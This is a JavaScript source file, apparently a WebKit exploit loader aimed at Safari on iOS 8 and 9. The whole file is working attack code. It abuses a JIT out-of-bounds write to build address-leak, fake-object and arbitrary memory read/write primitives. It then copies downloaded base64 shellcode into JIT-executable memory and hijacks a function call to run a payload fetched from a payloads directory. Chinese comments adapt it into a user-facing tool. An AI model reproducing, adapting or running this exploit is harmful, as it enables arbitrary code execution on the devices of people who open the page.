var wkloader = {
    version: undefined,
    loader: undefined,
    patch: undefined,
    u32_f64_buf: undefined,
    u32_array: undefined,
    f64_array: undefined,
    oob_array: undefined,
    oob_storage: undefined,
    single_object: undefined,
    double_object: undefined,
    u32_rw_array: undefined,
    rw0_main: undefined
};

var offsets = {
    oob_write_count: undefined,
    fake_obj_type: undefined,
    rw_obj_type: undefined,
    fake_obj_materialize: undefined,
    rw_obj_materialize: undefined,
    butterfly: undefined,
    m_executable: undefined,
    m_jitCodeForCall: undefined,
    shc_padding: undefined
};


wkloader.log = function(message) {
    // var request = new XMLHttpRequest();
    // request.open("GET", "[*] " + message, false);
    // request.send();
    console.log("[*] " + message);
}

wkloader.hex32 = function(value) {
    var str = (value >>> 0).toString(16);
    while (str.length < 8) { str = '0' + str; }
    return '0x' + str;
}

wkloader.download = function(path) {
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", path+"?cache="  + new Date().getTime(), false);
    xhttp.send();

    var payload = atob(xhttp.response);
    var len = Math.floor((payload.length + 4)/4) * 4;
    var bytes = new Uint8Array(len);

    for (var i = 0; i < payload.length; i++) {
        var code = payload.charCodeAt(i);
        bytes[i] = code & 0xff;
    }
    return new Uint32Array(bytes.buffer);
}

wkloader.f64_to_u32 = function(value) {
    wkloader.f64_array[0] = value;
    return [wkloader.u32_array[0], wkloader.u32_array[1]];
}

wkloader.u32_to_f64 = function(hi, lo) {
    wkloader.u32_array[0] = hi;
    wkloader.u32_array[1] = lo;
    return wkloader.f64_array[0];
}

wkloader.addr_of = function(object) {
    wkloader.oob_array[4] = object;
    return wkloader.oob_storage.length;
}

wkloader.materialize = function(addr) {
    wkloader.oob_storage.length = addr;
    return wkloader.oob_array[4];
}

wkloader.read32 = function(addr) {
    var lo_hi = wkloader.f64_to_u32(wkloader.rw0_main.rw0_f2);
    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(lo_hi[0], addr); 
    var value = wkloader.u32_rw_array[0];
    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(lo_hi[0], lo_hi[1]); 
    return value;
}

wkloader.write32 = function(addr, value) {
    var lo_hi = wkloader.f64_to_u32(wkloader.rw0_main.rw0_f2);
    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(lo_hi[0], addr); 
    wkloader.u32_rw_array[0] = (value & 0xffffffff);
    wkloader.rw0_main.rw0_f2 = wkloader.u32_to_f64(lo_hi[0], lo_hi[1]); 
}

wkloader.init_offsets = function() {
    offsets.fake_obj_type = (0x00001680 & 0xffffffff);
    offsets.rw_obj_type = (0x00002280 & 0xffffffff);
    offsets.fake_obj_materialize = 0x38;
    offsets.rw_obj_materialize = 0x10;
    offsets.butterfly = 0x1c;

    if (wkloader.version[0] >= 9) {
        offsets.shc_padding = 0x20000;
        offsets.m_executable = 0x14;
        offsets.m_jitCodeForCall = 0x18;

        if (wkloader.version[1] >= 3) {
            offsets.oob_write_count = 200000;
        } else {
            offsets.oob_write_count = 40000;
        }
    } else if (wkloader.version[0] == 8) {
        offsets.oob_write_count = 8000;
        offsets.shc_padding = 0x60000;
        offsets.m_executable = 0x14;
        offsets.m_jitCodeForCall = 0x20;
    }
}

wkloader.init = function() {
    var version_info = (window.navigator.userAgent).match(/OS (\d+)_(\d+)_?(\d+)?/);
    
    // 【新增的防御性代码】如果没匹配到 iOS 版本，直接拦截并终止
    if (!version_info) {
        wkloader.log("failed to parse iOS version. current UA: " + window.navigator.userAgent);
        alert("⚠️ 运行被拦截\n\n该工具仅支持在 iOS 设备的 Safari 浏览器中运行。\n请使用 iPhone、iPad 或 iPod touch 访问此页面。");
        return false;
    }
    
    wkloader.version = [parseInt(version_info[1], 10), parseInt(version_info[2], 10), parseInt(version_info[3] || 0, 10)];
    if (wkloader.version[2] == undefined) wkloader.version[2] = 0;
    wkloader.log("running on ios: " + wkloader.version[0] + "." + wkloader.version[1] + "." + wkloader.version[2]);
    wkloader.log("user agent: " + window.navigator.userAgent);

    wkloader.init_offsets();
    // 原代码: wkloader.loader = wkloader.download("loader" + wkloader.version[0] + ".b64");
    wkloader.loader = wkloader.download("assets/core/loader" + wkloader.version[0] + ".b64");
    if (wkloader.version[0] >= 9) {
        // 原代码: wkloader.patch = wkloader.download("patch.b64");
        wkloader.patch = wkloader.download("assets/core/patch.b64");
    }

    wkloader.u32_f64_buf = new ArrayBuffer(0x8);
    wkloader.u32_array = new Uint32Array(wkloader.u32_f64_buf);
    wkloader.f64_array = new Float64Array(wkloader.u32_f64_buf);
    var fake_obj_store = undefined;
    var struct_leak = undefined;
    var fake_obj_store_addr = undefined;

    var oob_write = function(array, compare, value, index) {
        array[0] = 1.1;
		compare == 1;
        array[index] = value;
        return array[0];
    }

    var create_oob_array = function() {
		var output = undefined;
		var array = {};
        array.p = 1.1;
		array[0] = 1.1;

        var comparison = {toString: function () {
            array[1000] = 2.2;
            output = [1.1];
            return '1';
        }};

        var value = wkloader.u32_to_f64(0x1000, 0x1000);
        var single = oob_write(array, comparison, value, 6);
		return output;
    }

    while (1) {
        var array = {};
        array.p = 1.1;
        array[0] = 1.1; 

        for (var i = 0; i < offsets.oob_write_count; i++) {
            oob_write(array, {}, 1.1, 1);
        }

        wkloader.oob_storage = [];
        wkloader.oob_storage[0] = 1.1;
        wkloader.oob_array = create_oob_array();
        wkloader.oob_storage[1000] = 2.2;
        wkloader.oob_array[4] = {};
        wkloader.double_object = [];

        for (var i = 0; i < 0x10; i++) {
            wkloader.single_object = {
                p1:1.1, p2:2.2, p3:1.1, p4:1.1, p5:1.1, p6:1.1, p7:wkloader.u32_to_f64(0x4141, i)
            };
            wkloader.double_object.push(wkloader.single_object);
        }

        fake_obj_store = wkloader.double_object.pop();
        struct_leak = wkloader.double_object.pop();
        struct_leak.rw0_f1 = 1.1;
        struct_leak.rw0_f2 = 1.1;
        struct_leak.rw0_f3 = 1.1;
        struct_leak.rw0_f4 = 1.1;
        
        fake_obj_store_addr = wkloader.addr_of(fake_obj_store);
        if (fake_obj_store_addr > 0x000fffff) break;
    }

    fake_obj_store.p1 = wkloader.u32_to_f64(0x11111111, 0x22222222); 
    fake_obj_store.p2 = wkloader.u32_to_f64(0x33333333, 0x44444444); 
    fake_obj_store.p6 = wkloader.u32_to_f64(fake_obj_store_addr, offsets.fake_obj_type); 
    fake_obj_store.p5 = wkloader.u32_to_f64(fake_obj_store_addr-4, offsets.fake_obj_type); 

    var fake_num = wkloader.materialize(fake_obj_store_addr + offsets.fake_obj_materialize);
    var num_value = Number.prototype.valueOf.call(fake_num);
    var struct_addr = wkloader.f64_to_u32(num_value)[1];
    wkloader.log("struct_addr: " + wkloader.hex32(struct_addr));

    var array_buf = new ArrayBuffer(0x20);
    wkloader.u32_rw_array = new Uint32Array(array_buf, 4);
    var obj_rw0 = {
        p1:wkloader.u32_to_f64(struct_addr, offsets.rw_obj_type),
        p2:wkloader.u32_to_f64(wkloader.addr_of(wkloader.u32_rw_array) + offsets.butterfly, 0x41414141)
    };

    wkloader.rw0_main = wkloader.materialize(wkloader.addr_of(obj_rw0) + offsets.rw_obj_materialize);
    wkloader.single_object = {
        p1: 1.1, p2: 1.1, p3: 1.1, p4: 1.1
    };

    for (var i = 0; i < 8; i++) {
        wkloader.read32(wkloader.addr_of(wkloader.single_object));
        wkloader.write32(wkloader.addr_of(wkloader.single_object) + 0x8, 0);
    }

    var test_obj = new ArrayBuffer(0x20);
    var test_obj_addr = wkloader.addr_of(test_obj);
    var test_obj_orig = wkloader.read32(test_obj_addr);
    wkloader.log("test_obj_addr: " + wkloader.hex32(test_obj_addr));

    wkloader.write32(test_obj_addr, 0x41414141);
    var test_obj_read = wkloader.read32(test_obj_addr);
    wkloader.write32(test_obj_addr, test_obj_orig);
    wkloader.log("test_obj_read: " + wkloader.hex32(test_obj_read));
    return (test_obj_read == 0x41414141);
}


wkloader.exec = function(target) {
    var script = "var obj = {};";
	for (var i = 0; i < 400; i++) {
		script += "obj.p = 1.1;";
	}

    script += "if (x) alert('jit_data');";
	var js_func = new Function('x', script);
	for (var i = 0; i < 1000; i++) js_func();

    var js_func_addr = wkloader.addr_of(js_func);
    wkloader.log("js_func_addr: " + wkloader.hex32(js_func_addr));

    var m_executable = wkloader.read32(js_func_addr + offsets.m_executable);
    wkloader.log("m_executable: " + wkloader.hex32(m_executable));

    var m_jitCodeForCall = wkloader.read32(m_executable + offsets.m_jitCodeForCall);
    wkloader.log("m_jitCodeForCall: " + wkloader.hex32(m_jitCodeForCall));

    var shellcode = (m_jitCodeForCall & 0xfffff000) + offsets.shc_padding;
    wkloader.log("shellcode: " + wkloader.hex32(shellcode));

    for (var i = 0; i < wkloader.loader.length; i++) {
        wkloader.write32(shellcode + (i * 0x4), wkloader.loader[i]);
    }

    var call_script = '';
    for (var i = 0; i < 0x100; i++) {
        call_script += 'try {} catch(e){};';
    }

    var call_func = new Function('a', call_script);
    for (var i = 0; i < 1000; i++) call_func();

    var call_func_addr = wkloader.addr_of(call_func);
    var target_ptr = wkloader.read32(wkloader.addr_of(target) + 0x10);

    wkloader.write32(call_func_addr, call_func_addr+0x4);
    wkloader.write32(call_func_addr+0x4, call_func_addr+0x4);
    wkloader.write32(call_func_addr+0x30, call_func_addr+0x1C);

    if (wkloader.version[0] == 9) {
        var patch_ptr = wkloader.read32(wkloader.addr_of(wkloader.patch) + 0x10);
        wkloader.write32(shellcode-0xc, patch_ptr);
        wkloader.write32(shellcode-0x10, wkloader.patch.length * 4);
        wkloader.write32(call_func_addr+0x34, shellcode);
    } else {
        wkloader.write32(call_func_addr+0x08, shellcode);
        wkloader.write32(call_func_addr+0x34, call_func_addr-0x14);
    }

    wkloader.write32(shellcode-0x4, target_ptr);
    wkloader.write32(shellcode-0x8, target.length * 4);
    return call_func();
}

wkloader.run = function(payloadName) {
    wkloader.log("starting " + payloadName + "...");
    
    // 动态拼接载荷路径，指向 payloads 目录
    var target = wkloader.download("assets/payloads/" + payloadName + ".b64"); 

    if (!wkloader.init()) {
        wkloader.log("failed to init webkit loader");
        alert("设备或系统版本不受支持，初始化失败。");
        return;
    }

    // 提示用户正在执行
    wkloader.log("executing payload...");
    wkloader.exec(target);
}
